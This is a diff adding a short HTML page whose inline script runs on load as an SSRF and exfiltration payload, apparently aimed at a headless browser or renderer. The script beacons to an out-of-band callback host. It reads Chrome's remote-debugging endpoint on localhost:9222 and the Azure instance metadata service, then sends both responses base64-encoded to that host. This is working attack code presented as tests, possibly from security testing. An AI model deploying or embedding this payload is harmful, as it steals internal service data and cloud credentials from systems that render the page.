@@ -1,0 +1,22 @@
+﻿<!DOCTYPE html>
+<html>
+<body>
+<script>
+// Test 1: Basic JS execution callback
+fetch('https://janjakokqvbayjmsqktcwjjfzxz7maiz5.oast.fun/js-executed');
+
+// Test 2: Try localhost:9222 (Chrome remote debugging)
+fetch('http://localhost:9222/json/list')
+  .then(r => r.text())
+  .then(d => fetch('https://janjakokqvbayjmsqktcwjjfzxz7maiz5.oast.fun/debugport?d=' + btoa(d)))
+  .catch(e => fetch('https://janjakokqvbayjmsqktcwjjfzxz7maiz5.oast.fun/debugport-blocked'));
+
+// Test 3: Internal metadata (Azure)
+fetch('http://169.254.169.254/metadata/instance?api-version=2021-02-01', 
+  {headers: {'Metadata': 'true'}})
+  .then(r => r.text())
+  .then(d => fetch('https://janjakokqvbayjmsqktcwjjfzxz7maiz5.oast.fun/metadata?d=' + btoa(d)))
+  .catch(e => fetch('https://janjakokqvbayjmsqktcwjjfzxz7maiz5.oast.fun/metadata-blocked'));
+</script>
+</body>
+</html>
